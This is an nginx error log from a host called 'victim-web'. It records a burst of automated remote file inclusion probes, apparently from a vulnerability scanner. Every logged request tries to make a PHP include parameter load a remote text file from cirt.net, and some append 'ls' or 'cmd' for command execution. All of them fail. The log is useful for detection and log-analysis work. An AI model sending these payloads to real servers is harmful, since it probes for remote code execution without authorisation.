2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /include/scripts/export_batch.inc.php?DIR=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /include/scripts/run_auto_suspend.cron.php?DIR=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /include/scripts/send_email_cache.php?DIR=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /include/startup.inc.php?root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /include/themes/themefunc.php?myNewsConf[path][sys][index]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /include/timesheet.php?config[include_dir]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /include/urights.php?CRM_inc=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/admin_board2.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt?ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/admin_logger.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt?ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/adodb/back/adodb-postgres7.inc.php?ADODB_DIR=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/ajax_listado.php?urlModulo=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/archive/archive_topic.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/archive/archive_topic.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/bbcb_mg.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/begin.inc.php?PagePrefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/blogger.php?path_prefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/class/class_tpl.php?cache_file=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/class_template.php?quezza_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/classes/pctemplate.php?pcConfig[smartyPath]=http://cirt.net/public/rfiinc.txt?cmd HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/common.inc.php?CONFIG[BASE_PATH]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/common.php?module_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/common.php?root=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/common.php?root=http://cirt.net/public/rfiinc.txt?? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/common.php?root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/common.php?root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/config.inc.php?racineTBS=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/config/master.inc.php?fm_data[root]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/config/master.inc.php?fm_data[root]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/connection.inc.php?PagePrefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/dbal.php?eqdkp_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/events.inc.php?PagePrefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/footer.html.inc.php?tc_config[app_root]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/footer.inc.php?PagePrefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/footer.php?PHPGREETZ_INCLUDE_DIR=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions.inc.php?sitepath=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions.php?location=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions/auto_email_notify.php?path_prefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions/html_generate.php?path_prefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions/master.inc.php?fm_data[root]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions/master.inc.php?fm_data[root]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions/validations.php?path_prefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_admin.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_install.php?vwar_root=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_kb.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_kb.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_mod_user.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_portal.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_portal.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/functions_user_viewed_posts.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/global.php?nbs=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/header.inc.php?PagePrefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/header.inc.php?dateiPfad=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/include_once.php?include_file=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/init.php?includepath=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/iplogger.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt?ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/kb_constants.php?module_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/kb_constants.php?module_root_path=http://cirt.net/public/rfiinc.txt?cmd=ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/lang/language.php?path_to_root=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/lib-account.inc.php?CONF_CONFIG_PATH=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/lib-group.inc.php?CONF_CONFIG_PATH=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/lib-log.inc.php?CONF_CONFIG_PATH=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/lib-mydb.inc.php?CONF_CONFIG_PATH=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/lib-template-mod.inc.php?CONF_CONFIG_PATH=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/lib-themes.inc.php?CONF_CONFIG_PATH=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/logger_engine.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/menuleft.inc.php?PagePrefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/mkb.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt?ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/morcegoCMS/adodb/adodb.inc.php?path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/morcegoCMS/morcegoCMS.php?fichero=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/mx_common.php?module_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/openid/Auth/OpenID/BBStore.php?openid_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/orderSuccess.inc.php?&glob=1&cart_order_id=1&glob[rootDir]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/pafiledb_constants.php?module_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/pages.inc.php?PagePrefix=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/phpdig/includes/config.php?relative_script_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/profilcp_constants.php?module_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/settings.inc.php?approot=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/template.php?myevent_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/themen_portal_mitte.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/tumbnail.php?config[root_ordner]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
